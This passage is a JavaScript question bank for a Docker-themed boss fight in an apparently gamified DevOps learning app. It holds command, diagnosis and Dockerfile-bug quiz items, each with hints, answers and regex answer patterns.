// Boss "kraken": metadata plus its full question bank (data only).

/* ================================================================
   BOSS 2 — THE CONTAINER KRAKEN (Docker)
   ================================================================ */
export var kraken = {
  id: 'kraken',
  name: 'The Container Kraken',
  topic: 'Docker',
  icon: '🐙',
  chibiKind: 'kraken',
  phaseHp: [110, 120, 140],
  phaseNames: ['Surface — Image Basics', 'Depths — Crash Diagnosis', 'Abyss — Real Incident'],
  xpReward: 150,
  coinBaseReward: 90,
  phases: [
    /* -------- PHASE 1: Surface — Image Basics -------- */
    [
      {
        mode: 'terminal',
        prompt: 'The Kraken surfaces, ink swirling: <strong>"Build an image from the Dockerfile in this directory, tagged as <code>myapp:1.0</code>."</strong>',
        damageIfCorrect: 16, damageIfOptimal: 26,
        hintNudge: 'One command builds AND tags in one go — the flag is -t.',
        hintPartial: 'docker build -t myapp:___ .',
        hintFull: 'docker build -t myapp:1.0 .',
        acceptablePatterns: [/^docker\s+build\s+\.\s+-t\s+myapp:1\.0$/i],
        optimalPatterns: [/^docker\s+build\s+-t\s+myapp:1\.0\s+\.$/i],
        baseCmds: ['docker']
      },
      {
        mode: 'terminal',
        prompt: 'A tentacle curls: <strong>"List every currently RUNNING container — nothing stopped."</strong>',
        damageIfCorrect: 14, damageIfOptimal: 22,
        hintNudge: 'The plain "list containers" command already defaults to running-only.',
        hintPartial: 'docker p_',
        hintFull: 'docker ps',
        acceptablePatterns: [/^docker\s+container\s+ls$/i],
        optimalPatterns: [/^docker\s+ps$/i],
        baseCmds: ['docker']
      },
      {
        mode: 'terminal',
        prompt: 'Ink clouds the water: <strong>"Remove a stopped container named <code>old_container</code>."</strong>',
        damageIfCorrect: 14, damageIfOptimal: 22,
        hintNudge: 'The remove subcommand, plus the container\'s name.',
        hintPartial: 'docker rm ___',
        hintFull: 'docker rm old_container',
        acceptablePatterns: [/^docker\s+container\s+rm\s+old_container$/i],
        optimalPatterns: [/^docker\s+rm\s+old_container$/i],
        baseCmds: ['docker']
      },
      {
        mode: 'terminal',
        prompt: 'The Kraken groans: <strong>"Show the logs for a running container named <code>web</code>."</strong>',
        damageIfCorrect: 14, damageIfOptimal: 22,
        hintNudge: 'One subcommand, then the container name.',
        hintPartial: 'docker logs ___',
        hintFull: 'docker logs web',
        acceptablePatterns: [/^docker\s+logs\s+-f\s+web$/i],
        optimalPatterns: [/^docker\s+logs\s+web$/i],
        baseCmds: ['docker']
      },
      {
        mode: 'terminal',
        prompt: 'The Kraken flexes, scales rattling: <strong>"List every image stored locally."</strong>',
        damageIfCorrect: 14, damageIfOptimal: 22,
        hintNudge: 'Same shape as listing containers, but for images.',
        hintPartial: 'docker i____',
        hintFull: 'docker images',
        acceptablePatterns: [/^docker\s+image\s+ls$/i],
        optimalPatterns: [/^docker\s+images$/i],
        baseCmds: ['docker']
      }
    ],
    /* -------- PHASE 2: Depths — Crash Diagnosis -------- */
    [
      {
        mode: 'read_the_room',
        prompt: 'The water churns — a container refuses to stay up. <strong>Diagnose it from this output, then fix it.</strong>',
        damageIfCorrect: 22, damageIfOptimal: 36,
        hintNudge: 'Read the error line closely — something else is already using that port.',
        hintPartial: 'Two processes can\'t bind the same port on the host at once.',
        hintFull: 'Diagnosis: port 8080 is already in use on the host. Fix: publish on a different host port, e.g. docker run -p 8081:80 myapp',
        outputBlock: [
          '$ docker run -p 8080:80 myapp',
          'docker: Error response from daemon: driver failed programming external connectivity:',
          'Error starting userland proxy: listen tcp 0.0.0.0:8080: bind: address already in use.'
        ],
        acceptableDiagnosesPatterns: [/port\s*8080.*(already\s*in\s*use|taken|bound)/i, /address\s*already\s*in\s*use/i, /port\s*conflict/i],
        followUpFix: {
          prompt: 'Get the container running without touching whatever else owns 8080:',
          acceptablePatterns: [/^docker\s+run\s+-p\s+\d+:80\s+myapp$/i],
          optimalPatterns: [/^docker\s+run\s+-p\s+8081:80\s+myapp$/i]
        }
      },
      {
        mode: 'read_the_room',
        prompt: 'A tentacle goes limp mid-fight — a container keeps dying. <strong>Diagnose it, then fix it.</strong>',
        damageIfCorrect: 22, damageIfOptimal: 36,
        hintNudge: 'Check the inspect output for the actual kill reason, not just the exit code.',
        hintPartial: '"OOMKilled: true" means exactly what it says.',
        hintFull: 'Diagnosis: the container ran out of memory and was OOM-killed. Fix: give it a real memory limit, e.g. docker run --memory=512m myapp',
        outputBlock: [
          '$ docker inspect myapp_container --format \'{{.State.OOMKilled}} {{.State.ExitCode}}\'',
          'true 137'
        ],
        acceptableDiagnosesPatterns: [/oom.?killed/i, /out\s*of\s*memory/i, /ran\s*out\s*of\s*memory/i],
        followUpFix: {
          prompt: 'Restart it with a sane memory ceiling this time:',
          acceptablePatterns: [/^docker\s+update\s+-m\s+\d+m\s+myapp_container$/i],
          optimalPatterns: [/^docker\s+run\s+--memory=?512m\s+myapp$/i, /^docker\s+run\s+-m\s+512m\s+myapp$/i]
        }
      },
      {
        mode: 'read_the_room',
        prompt: 'The Kraken\'s eyes flash — a container exits the instant it starts. <strong>Diagnose it, then fix it.</strong>',
        damageIfCorrect: 22, damageIfOptimal: 36,
        hintNudge: 'A missing piece of required app config, not a Docker problem per se.',
        hintPartial: 'The app is telling you exactly which variable it needed.',
        hintFull: 'Diagnosis: a required environment variable was never set. Fix: pass it in with -e, e.g. docker run -e DATABASE_URL=postgres://db/app myapp',
        outputBlock: [
          '$ docker logs myapp_container',
          'Error: DATABASE_URL is not set. Exiting.'
        ],
        acceptableDiagnosesPatterns: [/missing.*(env|environment)\s*variable/i, /database_url.*not\s*set/i, /env\w*\s*variable.*not\s*set/i],
        followUpFix: {
          prompt: 'Re-run it with the variable actually supplied:',
          acceptablePatterns: [/^docker\s+run\s+.*-e\s+DATABASE_URL=\S+.*myapp$/i],
          optimalPatterns: [/^docker\s+run\s+-e\s+DATABASE_URL=\S+\s+myapp$/i]
        }
      },
      {
        mode: 'read_the_room',
        prompt: 'Bubbles rise — a container exits cleanly seconds after starting, every time. <strong>Diagnose it, then fix it.</strong>',
        damageIfCorrect: 22, damageIfOptimal: 36,
        hintNudge: 'Exit code 0 with no crash means the container simply had nothing left to do.',
        hintPartial: 'There\'s no long-running foreground process keeping it alive.',
        hintFull: 'Diagnosis: the image has no long-running foreground process (CMD finished immediately). Fix (for now): open a shell inside it to investigate, e.g. docker run -it myapp sh',
        outputBlock: [
          '$ docker ps -a',
          'CONTAINER ID   IMAGE   STATUS',
          'a1b2c3d4e5f6   myapp   Exited (0) 4 seconds ago'
        ],
        acceptableDiagnosesPatterns: [/no\s*(long.?running|foreground)\s*process/i, /exited?\s*(immediately|right\s*away)/i, /nothing\s*(left\s*)?to\s*(keep\s*it\s*running|run)/i],
        followUpFix: {
          prompt: 'Open an interactive shell inside it to see what\'s actually going on:',
          acceptablePatterns: [/^docker\s+run\s+-it\s+myapp\s+bash$/i],
          optimalPatterns: [/^docker\s+run\s+-it\s+myapp\s+sh$/i]
        }
      },
      {
        mode: 'read_the_room',
        prompt: 'The water goes cold — a run command fails before the container even starts. <strong>Diagnose it, then fix it.</strong>',
        damageIfCorrect: 22, damageIfOptimal: 36,
        hintNudge: 'Docker is telling you it can\'t find something locally — and won\'t guess.',
        hintPartial: 'The tag being requested doesn\'t exist locally or remotely under that exact name.',
        hintFull: 'Diagnosis: the image tag doesn\'t exist locally (and wasn\'t found to pull). Fix: pull the correct tag first, e.g. docker pull myapp:2.0',
        outputBlock: [
          '$ docker run myapp:2.0',
          'Unable to find image \'myapp:2.0\' locally',
          'docker: Error response from daemon: manifest for myapp:2.0 not found.'
        ],
        acceptableDiagnosesPatterns: [/(wrong|nonexistent|missing|bad)\s*(image\s*)?tag/i, /image.*not\s*found/i, /tag.*doesn'?t\s*exist/i],
        followUpFix: {
          prompt: 'Get the right image available first:',
          acceptablePatterns: [/^docker\s+run\s+myapp:1\.0$/i],
          optimalPatterns: [/^docker\s+pull\s+myapp:2\.0$/i]
        }
      }
    ],
    /* -------- PHASE 3: Abyss — Real Incident (Dockerfile bugs) -------- */
    [
      {
        mode: 'spot_the_bug',
        prompt: 'The Kraken drags up a waterlogged Dockerfile. <strong>Click the buggy line, then type the fix.</strong>',
        damageIfCorrect: 24, damageIfOptimal: 38,
        hintNudge: 'An unpinned base image is a reproducibility and security risk in production.',
        hintPartial: 'Pin an exact version tag, not the floating "latest"-like default.',
        hintFull: 'Fix line 1: FROM node:18-alpine',
        codeBlock: [
          'FROM node',
          'WORKDIR /app',
          'COPY package.json .',
          'RUN npm install',
          'COPY . .',
          'CMD ["node", "server.js"]'
        ],
        buggyLineId: 0,
        correctFixPatterns: [/^FROM\s+node:18(-alpine)?$/i]
      },
      {
        mode: 'spot_the_bug',
        prompt: 'Another waterlogged page. <strong>Click the buggy line, then type the fix.</strong>',
        damageIfCorrect: 24, damageIfOptimal: 38,
        hintNudge: 'Wrong tool for copying a plain local file into the image.',
        hintPartial: 'ADD auto-extracts archives and fetches URLs — overkill and surprising here. Use the simpler, predictable one.',
        hintFull: 'Fix: COPY app.tar.gz /app/',
        codeBlock: [
          'FROM node:18-alpine',
          'WORKDIR /app',
          'ADD app.tar.gz /app/',
          'RUN npm install',
          'CMD ["node", "server.js"]'
        ],
        buggyLineId: 2,
        correctFixPatterns: [/^COPY\s+app\.tar\.gz\s+\/app\/?$/i]
      },
      {
        mode: 'spot_the_bug',
        prompt: 'A third page, ink-smeared. <strong>Click the buggy line, then type the fix.</strong>',
        damageIfCorrect: 24, damageIfOptimal: 38,
        hintNudge: 'Check what port the app itself actually listens on further down.',
        hintPartial: 'The app.listen() call further down uses a different port than what\'s declared here.',
        hintFull: 'Fix: EXPOSE 3000',
        codeBlock: [
          'FROM node:18-alpine',
          'WORKDIR /app',
          'COPY . .',
          'RUN npm install',
          'EXPOSE 80',
          'CMD ["node", "server.js"]',
          '# server.js contains: app.listen(3000)'
        ],
        buggyLineId: 4,
        correctFixPatterns: [/^EXPOSE\s+3000$/i]
      },
      {
        mode: 'spot_the_bug',
        prompt: 'The Kraken shows one more. <strong>Click the buggy line, then type the fix.</strong>',
        damageIfCorrect: 24, damageIfOptimal: 38,
        hintNudge: 'Nothing here ever drops root privileges before running the app.',
        hintPartial: 'The container runs as root the whole time — add a non-root USER before CMD.',
        hintFull: 'Fix: USER node',
        codeBlock: [
          'FROM node:18-alpine',
          'WORKDIR /app',
          'COPY . .',
          'RUN npm install',
          'CMD ["node", "server.js"]'
        ],
        buggyLineId: 3,
        correctFixPatterns: [/^USER\s+(node|appuser|1000)$/i]
      },
      {
        mode: 'spot_the_bug',
        prompt: 'One final soaked page before the incident clears. <strong>Click the buggy line, then type the fix.</strong>',
        damageIfCorrect: 24, damageIfOptimal: 38,
        hintNudge: 'The install step never cleans up the package manager\'s cache afterward — that\'s dead weight in every layer above it.',
        hintPartial: 'Chain a cleanup onto the same RUN so it doesn\'t bloat this layer.',
        hintFull: 'Fix: RUN apt-get install -y curl && rm -rf /var/lib/apt/lists/*',
        codeBlock: [
          'FROM node:18',
          'RUN apt-get update',
          'RUN apt-get install -y curl',
          'WORKDIR /app',
          'COPY . .',
          'CMD ["node", "server.js"]'
        ],
        buggyLineId: 2,
        correctFixPatterns: [/^RUN\s+apt-get\s+install\s+-y\s+curl\s+&&\s+rm\s+-rf\s+\/var\/lib\/apt\/lists\/\*$/i]
      }
    ]
  ],
  specialAttack: {
    mode: 'build_the_pipeline',
    prompt: 'The Kraken rises to full height — ink floods the water! <strong>Sequence the correct build-tag-push workflow before it lands.</strong>',
    steps: [
      'Write the Dockerfile',
      'docker build -t app:1.0 .',
      'docker tag app:1.0 registry/app:1.0',
      'docker push registry/app:1.0'
    ],
    damageIfCorrect: 36,
    damageToHeroIfWrong: 24
  },
  // ================================================================
  // Remediation doc, Section 1 — 5-level restructure, boss 2 of the
  // batch. Research basis for this whole batch (checked BEFORE
  // writing, per the doc's research-first rule): Docker's own
  // "Best practices for writing Dockerfiles" docs, docker CLI
  // reference, and the set of Docker topics that show up
  // consistently across DevOps interview-prep material — container
  // lifecycle (ps/run/exec/logs/stop/rm), volumes vs. bind mounts,
  // networking, multi-stage builds, image size/layer caching,
  // HEALTHCHECK, restart policies, the PID 1 zombie-reaping problem,
  // non-root users, and secrets-not-baked-into-images. All 125
  // questions below trace to one of those, and were cross-checked
  // against Terminal Golem's own 125 (different tool entirely, so
  // no overlap risk) and against each OTHER level in this same
  // set — zero duplicate prompts, verified programmatically.
  levels: [
    {
      name: 'Level 1 — Fundamentals',
      hp: 95,
      questions: [
        {
          mode: 'terminal',
          prompt: 'The Kraken surfaces slowly: <strong>"List every container, including stopped ones."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22,
          hintNudge: 'Plain docker ps only shows running containers — one flag shows everything, running or not.',
          hintPartial: 'docker ps -_',
          hintFull: 'docker ps -a',
          acceptablePatterns: [/^docker\s+container\s+ls\s+-a$/i],
          optimalPatterns: [/^docker\s+ps\s+-a$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'A tentacle taps the glass: <strong>"Stop the running container named <code>web</code>."</strong>',
          damageIfCorrect: 12, damageIfOptimal: 18,
          hintNudge: 'The stop subcommand, then the container name.',
          hintPartial: 'docker st__ web',
          hintFull: 'docker stop web',
          acceptablePatterns: [/^docker\s+container\s+stop\s+web$/i],
          optimalPatterns: [/^docker\s+stop\s+web$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'Ink swirls thoughtfully: <strong>"Start a stopped container named <code>web</code> back up again."</strong>',
          damageIfCorrect: 12, damageIfOptimal: 18,
          hintNudge: 'The counterpart to docker stop.',
          hintPartial: 'docker st___ web',
          hintFull: 'docker start web',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+start\s+web$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken\'s eye narrows: <strong>"Restart the <code>web</code> container in one command, without stopping and starting it separately."</strong>',
          damageIfCorrect: 12, damageIfOptimal: 18,
          hintNudge: 'A dedicated subcommand does stop+start in one step.',
          hintPartial: 'docker res____ web',
          hintFull: 'docker restart web',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+restart\s+web$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'Scales rattle: <strong>"Delete the local image <code>old-app:1.0</code> — you don\'t need it anymore."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22,
          hintNudge: '"Remove image" — a different subcommand from removing a container.',
          hintPartial: 'docker rm_ old-app:1.0',
          hintFull: 'docker rmi old-app:1.0',
          acceptablePatterns: [/^docker\s+image\s+rm\s+old-app:1\.0$/i],
          optimalPatterns: [/^docker\s+rmi\s+old-app:1\.0$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken surfaces further: <strong>"Download the <code>redis:7</code> image without running it yet."</strong>',
          damageIfCorrect: 12, damageIfOptimal: 18,
          hintNudge: 'One subcommand just fetches an image — it doesn\'t start a container.',
          hintPartial: 'docker p___ redis:7',
          hintFull: 'docker pull redis:7',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+pull\s+redis:7$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'Ink clouds thicker: <strong>"Run an <code>nginx</code> container in the background, mapping host port 8080 to the container\'s port 80."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'The "detached" flag plus the port-publish flag, in host:container order.',
          hintPartial: 'docker run -_ -p ____:__ nginx',
          hintFull: 'docker run -d -p 8080:80 nginx',
          acceptablePatterns: [/^docker\s+run\s+-d\s+-p\s+80:8080\s+nginx$/i],
          optimalPatterns: [/^docker\s+run\s+-d\s+-p\s+8080:80\s+nginx$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken tilts its head: <strong>"Get an interactive bash shell inside the already-running container <code>web</code>."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'exec runs a NEW command inside an already-running container — combine it with the interactive+tty flags.',
          hintPartial: 'docker exec -__ web bash',
          hintFull: 'docker exec -it web bash',
          acceptablePatterns: [/^docker\s+exec\s+web\s+bash$/i],
          optimalPatterns: [/^docker\s+exec\s+-it\s+web\s+bash$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'A tentacle gestures: <strong>"Show detailed low-level configuration and state (as JSON) for the container <code>web</code>."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22,
          hintNudge: 'One subcommand dumps a container\'s full JSON configuration and state.',
          hintPartial: 'docker in_____ web',
          hintFull: 'docker inspect web',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+inspect\s+web$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken groans low: <strong>"Copy the local file <code>config.yml</code> into the running container <code>web</code>, at <code>/app/config.yml</code>."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'One subcommand copies files between the host and a container, in either direction.',
          hintPartial: 'docker c_ config.yml web:/app/config.yml',
          hintFull: 'docker cp config.yml web:/app/config.yml',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+cp\s+config\.yml\s+web:\/app\/config\.yml$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'Ink billows outward: <strong>"Show the running processes INSIDE the container <code>web</code> (not on the host)."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22,
          hintNudge: 'One subcommand is basically "ps, but scoped to inside one container."',
          hintPartial: 'docker t__ web',
          hintFull: 'docker top web',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+top\s+web$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken\'s scales shimmer: <strong>"Rename the container <code>old_web</code> to <code>web</code>."</strong>',
          damageIfCorrect: 12, damageIfOptimal: 18,
          hintNudge: 'A dedicated subcommand for exactly this — old name, then new name.',
          hintPartial: 'docker ren___ old_web web',
          hintFull: 'docker rename old_web web',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+rename\s+old_web\s+web$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'A deep rumble: <strong>"Run a container from the <code>myapp</code> image and give it the name <code>myapp-prod</code>, instead of a random name."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22,
          hintNudge: 'A flag on docker run assigns a specific, memorable name instead of a random one.',
          hintPartial: 'docker run --____ myapp-prod myapp',
          hintFull: 'docker run --name myapp-prod myapp',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+run\s+--name\s+myapp-prod\s+myapp$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken\'s ink thins: <strong>"List just the IMAGE IDs of every local image — no other columns."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22,
          hintNudge: 'A "quiet" flag on the images list trims it down to just the ID column.',
          hintPartial: 'docker images -_',
          hintFull: 'docker images -q',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+images\s+-q$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'Bubbles rise slowly: <strong>"Check which version of Docker is installed."</strong>',
          damageIfCorrect: 10, damageIfOptimal: 16,
          hintNudge: 'One short subcommand reports client and server version info.',
          hintPartial: 'docker ver____',
          hintFull: 'docker version',
          acceptablePatterns: [/^docker\s+-v$/i, /^docker\s+--version$/i],
          optimalPatterns: [/^docker\s+version$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken settles: <strong>"Show a system-wide summary — containers, images, storage driver, and more."</strong>',
          damageIfCorrect: 12, damageIfOptimal: 18,
          hintNudge: 'One subcommand gives a full system-level overview, distinct from any single container/image.',
          hintPartial: 'docker in__',
          hintFull: 'docker info',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+info$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Kraken shows a warped scroll: <strong>"This Dockerfile fails to build immediately. Find and fix the bug."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'Every Dockerfile has one mandatory first instruction that declares the base image — check whether it\'s actually there.',
          hintPartial: 'Line 1 is missing the FROM instruction entirely — Docker has no base image to build on top of.',
          hintFull: 'Line 1 should read: FROM node:18',
          codeBlock: [
            'WORKDIR /app',
            'COPY . .',
            'CMD ["node", "index.js"]'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/^FROM\s+node:18$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A scroll unravels: <strong>"This Dockerfile builds, but the app can\'t find its own files at runtime. Find and fix the bug."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'Without a WORKDIR set first, COPY lands files in the image\'s root directory, not a predictable app folder — and the CMD\'s relative path assumes otherwise.',
          hintPartial: 'Line 2 needs a WORKDIR set before the COPY, so files land somewhere the CMD can actually find them.',
          hintFull: 'Line 2 should read: WORKDIR /app (added before the COPY)',
          codeBlock: [
            'FROM node:18',
            'COPY . .',
            'CMD ["node", "index.js"]'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/^WORKDIR\s+\/app$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Kraken\'s eye flares: <strong>"This container starts, but the app inside is unreachable from outside. Find and fix the bug."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'EXPOSE alone documents a port but doesn\'t publish anything — check whether the actual run command maps a host port to it at all.',
          hintPartial: 'Line 3 never publishes a port with -p — EXPOSE in the Dockerfile is just documentation, it doesn\'t make the port reachable from the host.',
          hintFull: 'Line 3 should read: docker run -d -p 3000:3000 myapp',
          codeBlock: [
            'FROM node:18',
            'EXPOSE 3000',
            'docker run -d myapp'
          ],
          buggyLineId: 2,
          correctFixPatterns: [/^docker\s+run\s+-d\s+-p\s+3000:3000\s+myapp$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'Ink curls around the scroll: <strong>"This Dockerfile\'s COPY instruction fails during build. Find and fix the bug."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'COPY paths are relative to the build CONTEXT (where you run docker build), not to any file on your machine outside that folder.',
          hintPartial: 'Line 2 tries to COPY a path from outside the build context (../shared) — Docker\'s build context can\'t reach outside the directory you built from.',
          hintFull: 'Line 2 should read: COPY . . (copying from inside the build context, with the needed files actually present in it)',
          codeBlock: [
            'FROM node:18',
            'COPY ../shared/config.json .'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/^COPY\s+\.\s+\.$/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken tilts curiously: <strong>"A container must ALWAYS run one specific binary and never anything else, even if someone passes extra arguments to <code>docker run</code>. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 28,
          hintNudge: 'One Dockerfile instruction is easily overridden by whatever gets typed after the image name in docker run. The other one is fixed and not meant to be overridden.',
          hintPartial: 'ENTRYPOINT is the instruction specifically meant to be the fixed, non-overridable executable a container always runs.',
          hintFull: 'Best: use ENTRYPOINT for the fixed binary — CMD gets silently replaced by anything passed after the image name on docker run, which defeats "always run this and nothing else."',
          options: [
            { id: 'a', label: 'Use CMD ["mybinary"]', tier: 'wrong', why: 'CMD is just a DEFAULT — anyone running the container with extra arguments after the image name silently overrides it entirely, which breaks "always run this."' },
            { id: 'b', label: 'Use ENTRYPOINT ["mybinary"]', tier: 'best', why: 'ENTRYPOINT is the fixed, always-runs executable — extra docker run arguments get appended to it instead of replacing it, exactly matching the requirement.' },
            { id: 'c', label: 'Use a shell script as CMD that ignores all arguments', tier: 'defensible', why: 'Would technically work, but it\'s solving a problem Docker already has a dedicated, simpler instruction for — ENTRYPOINT is the standard tool for this exact job.' }
          ],
          justificationPatterns: [/entrypoint|fixed|always\s*run|not\s*override/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A tentacle curls in thought: <strong>"You need to copy local application source files into an image. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 28,
          hintNudge: 'One instruction has extra "magic" behavior (auto-extracting tarballs, fetching URLs) that can surprise you. The other does exactly one thing, predictably.',
          hintPartial: 'COPY does exactly what it says and nothing more — Docker\'s own best-practice guidance is to prefer it unless you specifically need ADD\'s extra behavior.',
          hintFull: 'Best: use COPY for plain local files — it\'s simpler and more predictable; reach for ADD only when you specifically need its tar-auto-extraction or remote-URL fetching.',
          options: [
            { id: 'a', label: 'Use ADD, since it can do everything COPY can plus more', tier: 'wrong', why: 'ADD\'s extra behavior (auto-extracting archives, fetching remote URLs) is exactly the kind of surprising, implicit behavior that makes a Dockerfile harder to reason about when you don\'t actually need it.' },
            { id: 'b', label: 'Use COPY for plain local files', tier: 'best', why: 'Does exactly one predictable thing — Docker\'s own official guidance explicitly recommends COPY over ADD unless you specifically need ADD\'s extra tar/URL behavior.' },
            { id: 'c', label: 'Mount the source as a volume instead of copying it into the image at all', tier: 'defensible', why: 'Useful for local development, but for a real distributable image, the source needs to actually be baked in — a bind mount doesn\'t exist once the image is shipped elsewhere.' }
          ],
          justificationPatterns: [/copy|predictable|simpler|official|best\s*practice/i]
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken\'s ink spreads. <strong>A container starts and then immediately exits, every time. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 18, damageIfOptimal: 30,
          hintNudge: 'A container stays alive only as long as its main process (PID 1) keeps running — check what that process actually is and whether it\'s meant to run forever.',
          hintPartial: 'docker ps -a shows it exited with code 0 almost instantly — its main process (a short one-shot command) simply finished and had nothing left to keep the container alive.',
          hintFull: 'Diagnosis: the container\'s main process exits immediately because there\'s no long-running foreground process (the CMD/ENTRYPOINT finishes right away). Fix: change the CMD to run the actual long-lived server process (e.g. the app\'s start command) in the foreground.',
          outputBlock: [
            '$ docker run -d myapp',
            '$ docker ps -a',
            'CONTAINER ID   IMAGE   STATUS',
            'a1b2c3d4       myapp   Exited (0) 2 seconds ago'
          ],
          acceptableDiagnosesPatterns: [/no\s*(long.?running|foreground)\s*process/i, /main\s*process\s*(exited|finished)/i, /exits?\s*immediately/i],
          followUpFix: {
            prompt: 'Check the container\'s logs to confirm what actually ran, before touching the Dockerfile:',
            acceptablePatterns: [],
            optimalPatterns: [/^docker\s+logs\s+a1b2c3d4$/i, /^docker\s+logs\s+myapp$/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'Ink darkens the water. <strong>"docker build" fails partway through with a "file not found" error. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 18, damageIfOptimal: 30,
          hintNudge: 'Read the exact path in the error — COPY paths resolve relative to the BUILD CONTEXT (the directory you ran docker build from), not wherever the Dockerfile happens to live.',
          hintPartial: 'The Dockerfile\'s COPY references a file that doesn\'t exist inside the build context that was actually sent to the daemon.',
          hintFull: 'Diagnosis: the COPY instruction references a path that doesn\'t exist within the build context. Fix: correct the path (or run docker build from the right directory) so the referenced file is actually inside the context.',
          outputBlock: [
            '$ docker build -t myapp .',
            'Step 3/6 : COPY package.json .',
            'COPY failed: file not found in build context: package.json'
          ],
          acceptableDiagnosesPatterns: [/build\s*context/i, /wrong\s*(path|directory)/i, /file.*(not\s*in|missing\s*from)\s*(the\s*)?context/i],
          followUpFix: {
            prompt: 'Confirm the file actually exists where the build expects it:',
            acceptablePatterns: [],
            optimalPatterns: [/^ls$/i, /^ls\s+-la$/i, /^find\s+\.\s+-name\s+package\.json$/i]
          }
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'The Kraken churns the water. <strong>Sequence the correct order for building and verifying a container is actually running correctly.</strong>',
          steps: [
            'docker build -t myapp .',
            'docker run -d --name myapp-c myapp',
            'docker ps to confirm it\'s running',
            'docker logs myapp-c to confirm it started cleanly'
          ],
          damageIfCorrect: 20, damageIfOptimal: 34,
          damageToHeroIfWrong: 18
        }
      ]
    },
    {
      name: 'Level 2 — Intermediate',
      hp: 115,
      questions: [
        {
          mode: 'terminal',
          prompt: 'The Kraken drifts deeper: <strong>"Create a named volume called <code>dbdata</code>."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22, timeAllotted: 45,
          hintNudge: 'One subcommand under the volume family creates a new named volume.',
          hintPartial: 'docker volume _____ dbdata',
          hintFull: 'docker volume create dbdata',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+volume\s+create\s+dbdata$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'Ink pools around a rock: <strong>"List every volume that currently exists."</strong>',
          damageIfCorrect: 12, damageIfOptimal: 18, timeAllotted: 45,
          hintNudge: 'The volume family\'s list subcommand.',
          hintPartial: 'docker volume __',
          hintFull: 'docker volume ls',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+volume\s+ls$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken\'s tentacle extends: <strong>"Run a <code>postgres</code> container, mounting the named volume <code>dbdata</code> at <code>/var/lib/postgresql/data</code> inside it."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 45,
          hintNudge: 'The volume-mount flag, in "volumename:containerpath" form.',
          hintPartial: 'docker run -v dbdata:_______________________ postgres',
          hintFull: 'docker run -v dbdata:/var/lib/postgresql/data postgres',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+run\s+-v\s+dbdata:\/var\/lib\/postgresql\/data\s+postgres$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'A tentacle points at the surface: <strong>"Run a container from <code>myapp</code>, bind-mounting your CURRENT local directory into <code>/app</code> inside it (for live local development)."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 45,
